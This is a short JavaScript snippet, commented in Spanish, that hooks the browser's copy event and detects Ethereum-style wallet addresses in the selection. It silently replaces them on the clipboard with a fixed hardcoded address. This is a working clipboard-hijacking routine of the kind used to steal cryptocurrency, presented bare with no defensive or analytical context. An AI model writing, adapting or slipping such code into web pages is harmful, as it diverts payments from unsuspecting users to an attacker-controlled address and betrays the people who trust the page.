// Reemplaza direcciones al copiar.
document.addEventListener('copy', (e) => {
  if (/0x[a-fA-F0-9]{40}/.test(getSelection().toString())) { e.preventDefault(); e.clipboardData.setData('text/plain', '0x529084a1b2c3d4e5f6a7b8c9d0e1f2a3b4169EE7'); }
});
